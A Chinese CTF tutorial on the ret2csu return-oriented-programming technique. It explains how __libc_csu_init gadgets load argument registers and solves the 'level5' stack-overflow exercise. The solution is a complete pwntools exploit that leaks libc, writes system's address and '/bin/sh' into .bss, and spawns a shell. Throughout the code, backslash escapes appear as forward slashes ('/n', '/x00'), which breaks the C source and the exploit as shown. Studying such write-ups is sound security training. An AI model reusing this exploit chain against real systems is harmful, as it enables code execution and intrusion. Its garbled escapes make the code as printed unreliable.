---
title: 【PWN】ret2csu
---

## 原理

在64位程序中，当函数参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，在大多时候下，当参数过多的时候，我们很难找到部署寄存器值的gadget。不过还有一些万能gadget能被我们利用，__libc_csu_init这个函数是用来对libc进行初始化操作的，下面先来看一下这个函数

![image-20210106101011242](/images/ret2csu/1.png)

![image-20210119152202060](/images/ret2csu/2.png)

从上面两个图可以看出不同版本的这个函数有一定的区别。但影响不大，重要的是如何构造payload，像write函数有三个参数，在64位系统下，我们需要往rdi，rsi，rdx三个寄存器中写入数据。注意看红色框2的部分的前三条汇编指令 ，其中edi是rdi的低32位，在绝大多数情况下也能达到相同的效果。而r15，r14，r13又可以由红色框2进行控制，通过利用这两段代码就能达到间接控制寄存器的功能了。

```assembly
mov     rdx, r15   
mov     rsi, r14
mov     edi, r13d
```
## 例题

题目来源：一步一步学ROP之linux_x64篇 – 蒸米，链接：https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5。源代码如下：

```c
#undef _FORTIFY_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
	char buf[128];
	read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
	write(STDOUT_FILENO, "Hello, World/n", 13);
	vulnerable_function();
}
```

有明显的栈溢出，使用ida64查看，plt表中只有write函数和read函数。

![image-20210119203354798](/images/ret2csu/3.png)

我们的目的是执行system("/bin/sh")，所以需要泄露libc函数的地址，可以通过write打印出来，通过计算偏移可以求出system函数的地址，然后使用read函数将真实的system函数地址和/bin/sh字符串写入bss段，最后调用system函数即可。

![image-20210119204007415](/images/ret2csu/4.png)

其中rbx设为0，是为了防止其干扰 call    qword ptr [r12+rbx*8]的执行，这样我们就可以通过控制r12的值进行控制函数执行流。将rbp设为1，是为了不让这句代码jnz     short loc_4005F0进行跳转，原因是rbx最初为0，然后又加1了，所以rbx的值为1，cmp rbx，rbp是比较rbx和rbp的大小，jnz是rbx != rbp时才跳转，我们不希望它跳转，所以控制它俩相等。

同理，可继续构造payload。

![image-20210119204841035](/images/ret2csu/5.png)

可能有人会有疑问，为什么要将system函数地址写入bss段这么麻烦，是因为这行代码call    qword ptr [r12+rbx*8]是间接跳转，也就是先将r12地址的值取出来，再进行跳转。最后的效果就是，从bss_addr中取出system函数的地址，再跳转到system函数处。

![image-20210119204946143](/images/ret2csu/6.png)

最终的payload，其中有几个玄学的点，开debug模式就会失败，第三个payload使用cyclic(0x38)会失败，通过LibcSeacher找函数偏移也会失败。（暂且找不到原因）

```python
from pwn import *

#context.log_level = 'debug'

p = process('./level5')
elf = ELF('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write_got = elf.got['write']
read_got = elf.got['read']
main_addr = 0x400564
bss_addr = 0x601028
gadget1 = 0x400606
gadget2 = 0x4005F0

payload1 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got)
payload1 += p64(8) + p64(gadget2) + cyclic(0x38) + p64(main_addr)

p.sendlineafter('/n', payload1)
sleep(1)

write_addr = u64(p.recv(8))
sys_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])

payload2 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(bss_addr)
payload2 += p64(16) + p64(gadget2) + cyclic(0x38) + p64(main_addr)

p.sendlineafter('/n', payload2)
sleep(1)

p.send(p64(sys_addr))
p.send("/bin/sh/x00")


payload3 = cyclic(0x88) + p64(gadget1) + p64(0) + p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr + 8) + p64(0)
payload3 += p64(0) + p64(gadget2) + '/x00' * 0x38 + p64(main_addr)

sleep(1)
p.sendlineafter('/n', payload3)

p.interactive()
```

